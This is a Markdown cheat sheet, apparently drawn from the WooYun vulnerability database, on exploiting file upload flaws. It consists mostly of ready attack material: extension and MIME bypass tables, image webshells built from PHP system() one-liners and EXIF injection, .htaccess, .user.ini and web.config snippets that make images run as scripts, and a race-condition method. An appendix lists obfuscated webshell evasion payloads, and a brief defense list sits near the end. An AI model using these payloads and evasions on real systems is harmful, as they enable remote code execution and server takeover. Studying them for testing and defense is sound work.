# Web Security - File Upload Vulnerabilities

> Source: WooYun Vulnerability Database | Split from web-file-infra.md

## I. File Upload Vulnerabilities

### 1.1 Vulnerability Essence

```
Attack chain: Find upload point -> Bypass detection -> Obtain path -> Exploit parsing -> Execute Webshell
Success rate = P(bypass detection) x P(obtain path) x P(parse and execute)
```

Core conflict: Functional requirement (allow uploads) vs. security requirement (restrict execution). Most defenses focus only on "bypassing detection" and ignore path disclosure and parser configuration.

### 1.2 Upload Point Identification

| Upload Point Type | Frequency | Risk | Typical Path |
|---|---|---|---|
| Rich text editor | 42% | Extremely high | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| Avatar upload | 18% | High | `/upload/avatar/`, `/member/uploadfile/` |
| Attachments/documents | 15% | High | `/uploads/`, `/attachment/` |
| Admin features | 12% | Extremely high | `/admin/upload/`, `/system/upload/` |
| Import features | 5% | High | `/import/`, `/excelUpload/` |

Editor test paths:

| Editor | Test Path | Upload Endpoint |
|---|---|---|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

### 1.3 Bypass Techniques - Extension

Blacklist bypass quick reference:

| Technique | PHP | ASP/ASPX | JSP |
|---|---|---|---|
| Case variation | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| Double-write | `.pphphp` | `.asaspp` | `.jsjspp` |
| Special suffixes | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| Space/dot | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| %00 truncation | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| Semicolon (IIS) | N/A | `.asp;.jpg` | N/A |
| Newline (Apache) | `.php\x0a` | N/A | N/A |

Whitelist bypass methods:

| Technique | Principle | Condition |
|---|---|---|
| Parser vulnerability | Upload whitelisted file but gets specially parsed | IIS/Apache/Nginx vulnerability |
| Apache multi-extension | `shell.php.jpg` parsed as php | Apache multi-extension config |
| %00 truncation | `shell.php%00.jpg` | PHP < 5.3.4 |
| Config file upload | Upload `.htaccess`/`.user.ini` | txt/config files allowed |
| Image webshell + LFI | Upload image webshell combined with file inclusion | LFI vulnerability exists |

### 1.4 Bypass Techniques - MIME/Content-Type

```
Modify Content-Type to any of the following to bypass:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (generic)

Burp interception and modification example:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- Key modification point
```

### 1.5 Bypass Techniques - File Header/Content Detection

Common file Magic Numbers:

| Type | Magic Number (Hex) | ASCII |
|---|---|---|
| JPEG | `FF D8 FF` | No readable ASCII |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

Creating image webshells:

```bash
# Method 1: Simple file header prepend
GIF89a<?php system($_POST['cmd']); ?>

# Method 2: File merge
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# Method 3: EXIF injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 1.6 Web Server Parser Vulnerabilities

```
IIS 5.x/6.0:
  Directory parsing: /shell.asp/1.jpg     -> Parsed as ASP
  File parsing:      shell.asp;.jpg       -> Parsed as ASP
  Malformed parsing: shell.asp.jpg        -> May be parsed as ASP

Apache:
  Multi-extension: shell.php.xxx          -> Parsed right-to-left
  .htaccess: AddType application/x-httpd-php .jpg
  Newline parsing: shell.php%0a           -> CVE-2017-15715

Nginx:
  Malformed parsing: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  Null byte: shell.jpg%00.php             -> Older version vulnerability

Tomcat:
  PUT method: PUT /shell.jsp/             -> CVE-2017-12615
```

### 1.7 Config File Parser Hijacking

```apache
# .htaccess: make jpg files be parsed as PHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): auto-prepend image webshell
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): make jpg files handled by FastCGI -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 Race Condition Exploitation

```
Principle: A time gap exists between upload and deletion
Exploitation: Multi-threaded upload + access; execute malicious code before deletion
Technique: The malicious file first creates a new file in another location; the new file is not cleaned up
```

### 1.9 Defense Measures

1. Whitelist validation: Allow only specific extensions (`.jpg .png .gif .pdf`)
2. Multi-layer validation: Extension + MIME (finfo_file) + file header + getimagesize()
3. File renaming: `uniqid() + fixed extension`, completely removing the original filename
4. Disable execution: Prohibit script execution permissions in the upload directory
5. Least privilege: `chmod 0644`, web user cannot execute
6. Check before store: Validate first then save, use atomic operations to prevent race conditions
7. Path hiding: Do not return full paths, use CDN or randomized URLs

---


---
## Appendix: Webshell Evasion Quick Reference

## Appendix B: Webshell Evasion Techniques Quick Reference

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // String concatenation
array_map('ass'.'ert', array($_POST['x']));            // Callback function
$f = create_function('', $_POST['x']); $f();           // Dynamic function
set_exception_handler('system');                        // Exception handler
throw new Exception($_POST['cmd']);
```
